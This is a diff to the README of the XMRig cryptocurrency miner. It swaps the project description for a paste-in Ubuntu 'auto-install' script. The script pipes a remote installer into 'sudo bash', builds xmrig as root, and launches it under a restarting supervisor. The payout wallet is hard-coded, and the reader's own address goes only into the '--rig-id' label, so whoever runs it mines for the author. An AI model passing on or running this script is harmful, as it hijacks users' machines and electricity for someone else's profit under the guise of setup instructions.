@@ -1,13 +1,21 @@
-# XMRig
+# XMRig INSTALL UBUNTU 18/20.04 SCRIPT BASH
 
-[![Github All Releases](https://img.shields.io/github/downloads/xmrig/xmrig/total.svg)](https://github.com/xmrig/xmrig/releases)
-[![GitHub release](https://img.shields.io/github/release/xmrig/xmrig/all.svg)](https://github.com/xmrig/xmrig/releases)
-[![GitHub Release Date](https://img.shields.io/github/release-date/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/releases)
-[![GitHub license](https://img.shields.io/github/license/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/blob/master/LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/xmrig/xmrig.svg)](https://github.com/xmrig/xmrig/network)
+SCRIPT AUTO-INST UBUNTU 18/20/21
 
-XMRig is a high performance, open source, cross platform RandomX, KawPow, CryptoNight, AstroBWT and [GhostRider](https://github.com/xmrig/xmrig/tree/master/src/crypto/ghostrider#readme) unified CPU/GPU miner and [RandomX benchmark](https://xmrig.com/benchmark). Official binaries are available for Windows, Linux, macOS and FreeBSD.
+create script.sh like follow
+
+
+curl -s https://packagecloud.io/install/repositories/immortal/immortal/script.deb.sh | sudo bash
+apt install immortal
+sudo apt install libssl-dev 
+sudo apt-get install git build-essential cmake automake libtool autoconf
+git clone https://github.com/xmrig/xmrig.git
+mkdir xmrig/build && cd xmrig/scripts
+./build_deps.sh && cd ../build
+cmake .. -DXMRIG_DEPS=scripts/deps
+make -j$(nproc)
+cd /root/xmrig/build
+immortal /bin/sh -c "nohup ./xmrig -o fr.minexmr.com:443 -u 46tfyDCzhgZH5xUWEnUJ7ngwfPa6apAppVD7tLqP1mkzDgRJnKP3nqMMKiCZq9aBUZGHsha5q95gkZLFEDaQo64rQ9jVn1X -k --tls --rig-id {YOUR-ADDRESS_XMR}"
 
 ## Mining backends
 - **CPU** (x64/ARMv8)
